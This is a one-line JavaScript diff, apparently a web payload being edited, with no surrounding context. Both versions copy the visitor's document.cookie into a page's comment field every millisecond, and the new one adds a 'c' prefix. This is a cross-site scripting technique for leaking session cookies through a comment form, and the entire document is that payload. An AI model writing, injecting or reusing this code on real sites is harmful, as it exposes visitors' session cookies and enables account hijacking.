@@ -1,1 +1,1 @@
-setInterval(() => { document.getElementById("comment").value = document.cookie; }, 1);
+setInterval(() => { document.getElementById("comment").value = "c" + document.cookie; }, 1);
